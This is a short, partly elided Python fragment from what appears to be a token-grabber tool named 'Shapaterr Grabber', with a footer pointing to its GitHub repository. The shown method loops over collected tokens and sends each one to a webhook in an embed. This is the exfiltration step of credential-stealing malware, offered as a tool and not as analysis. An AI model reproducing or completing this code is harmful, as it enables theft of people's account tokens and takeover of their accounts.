...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="github.com/shapater/shapaterrgrabber")

            self.webhook.send(embed=embed, username="Shapaterr Grabber",
                              avatar_url="https://i.ibb.co/b3cKVKh/logo.png")
